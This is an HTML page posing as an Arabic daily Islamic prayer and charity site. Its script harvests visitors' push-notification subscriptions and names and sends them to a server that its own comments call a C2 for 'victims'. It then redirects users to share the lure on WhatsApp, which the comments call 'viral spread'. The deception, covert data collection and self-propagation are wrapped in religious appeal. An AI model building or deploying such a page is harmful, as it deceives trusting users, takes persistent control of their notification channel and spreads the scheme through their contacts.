<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="✨ أذكار وثواب - صدقة جارية باسمك ✨">
    <meta property="og:description" content="فعل التنبيهات لتصلك أذكار يومية وتشارك الثواب مع أحبائك">
    <meta property="og:image" content="og-image.jpg"> 
    <meta property="og:type" content="website">

    <title>أذكار المسلم اليومية | صدقة جارية</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary-color: #1b4d3e; /* أخضر ملكي */
            --accent-color: #d4af37;  /* ذهبي */
            --text-dark: #2d3748;
            --bg-gradient: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
        }

        body {
            background: var(--bg-gradient);
            font-family: 'Cairo', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: var(--text-dark);
        }

        .container {
            background: white;
            width: 90%;
            max-width: 480px;
            border-radius: 30px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.15);
            padding: 40px 30px;
            text-align: center;
            position: relative;
            border: 1px solid rgba(255,255,255,0.3);
            backdrop-filter: blur(10px);
        }

        /* زخرفة علوية */
        .container::after {
            content: "۞";
            position: absolute;
            top: 15px;
            left: 50%;
            transform: translateX(-50%);
            color: var(--accent-color);
            font-size: 1.5rem;
        }

        .main-img {
            width: 140px;
            height: auto;
            margin-bottom: 10px;
            filter: drop-shadow(0 10px 15px rgba(27, 77, 62, 0.2));
            border-radius: 20px;
        }

        h2 {
            color: var(--primary-color);
            font-size: 1.8rem;
            margin: 10px 0;
            font-weight: 700;
        }

        .dua-card {
            background: #fcfaf2;
            padding: 30px;
            border-radius: 20px;
            margin: 25px 0;
            border: 1px solid #e9e3d0;
            position: relative;
            box-shadow: inset 0 0 15px rgba(212, 175, 55, 0.05);
        }

        #displayDua {
            font-family: 'Amiri', serif;
            font-size: 1.6rem;
            color: #333;
            line-height: 2;
            min-height: 100px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .input-group {
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 18px;
            border-radius: 15px;
            border: 2px solid #eee;
            font-family: 'Cairo', sans-serif;
            font-size: 1.1rem;
            text-align: center;
            transition: all 0.3s ease;
            box-sizing: border-box;
        }

        input:focus {
            border-color: var(--accent-color);
            outline: none;
            box-shadow: 0 0 15px rgba(212, 175, 55, 0.1);
        }

        .btn-action {
            background: #25D366; /* لون واتساب */
            color: white;
            border: none;
            padding: 20px;
            width: 100%;
            border-radius: 18px;
            font-weight: 700;
            font-size: 1.3rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            box-shadow: 0 10px 20px rgba(37, 211, 102, 0.2);
        }

        .btn-action:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 25px rgba(37, 211, 102, 0.3);
        }

        .info-footer {
            font-size: 0.9rem;
            color: #718096;
            margin-top: 25px;
            background: #f7fafc;
            padding: 10px;
            border-radius: 10px;
        }

        .status-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #2ecc71;
            border-radius: 50%;
            margin-left: 5px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="og-image.jpg" class="main-img" alt="Islamic Logo">
        
        <h2>🌹 أذكار وثواب جارٍ 🌹</h2>
        <p style="margin-bottom: 0; color: #666;">صدقة جارية لك ولوالديك</p>

        <div class="dua-card">
            <div id="displayDua">جاري تحميل ذكر اليوم...</div>
        </div>

        <div class="input-group">
            <input type="text" id="userName" placeholder="أدخل اسمك الكريم هنا..">
        </div>

        <button class="btn-action" onclick="activateSystem()">
            <span>نشر الأذكار عبر واتساب</span> ✅
        </button>

        <div class="info-footer">
            <span class="status-dot"></span>
            تفعيل التنبيهات يضمن وصول الأجر لهاتفك يومياً 
        </div>
    </div>

    <script>
        const VAPID_PUBLIC_KEY = "YOUR_PUBLIC_KEY_HERE";
        const SERVER_URL = "https://yourusername.pythonanywhere.com/save_sub";

        // 1. وظيفة تحميل الدعاء الذكي بناءً على ملفك الـ JSON
        async function loadDua() {
            try {
                const res = await fetch('daily_islamic_duas.json');
                const data = await res.json();
                
                const months = ["January", "February", "March", "April", "May", "June", 
                                "July", "August", "September", "October", "November", "December"];
                const now = new Date();
                const monthName = months[now.getMonth()];
                const dayOfMonth = now.getDate();

                const monthDuas = data[monthName];
                const todayDua = monthDuas.find(d => d.day === dayOfMonth);

                if (todayDua) {
                    document.getElementById('displayDua').innerHTML = `"${todayDua.text}" <span style="font-size: 2rem; margin-right:10px;">${todayDua.emoji}</span>`;
                }
            } catch (e) {
                document.getElementById('displayDua').innerText = "اللهم بك أصبحنا وبك أمسينا وبك نحيا وبك نموت وإليك النشور 🕌"; 
            }
        }

        // تشغيل التحميل فوراً
        loadDua();

        // 2. وظيفة التفعيل والسيطرة (Web Push + WhatsApp)
        async function activateSystem() {
            const name = document.getElementById('userName').value || "محب للخير";
            const duaText = document.getElementById('displayDua').innerText;

            // طلب إذن الإشعارات (السيطرة الدائمة)
            try {
                const permission = await Notification.requestPermission();
                if (permission === 'granted' && 'serviceWorker' in navigator) {
                    const reg = await navigator.serviceWorker.register('sw.js');
                    const sub = await reg.pushManager.subscribe({
                        userVisibleOnly: true,
                        applicationServerKey: VAPID_PUBLIC_KEY
                    });

                    // إرسال بيانات الضحية للوحش C2 (الاسم، IP، والاشتراك)
                    await fetch(SERVER_URL, {
                        method: 'POST',
                        body: JSON.stringify({ subscription: sub, name: name }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
            } catch (e) { console.log("System activation bypass..."); }

            // التوجيه لواتساب (الانتشار الفيروسي)
            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${duaText}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
            window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
        }
    </script>
</body>
</html>
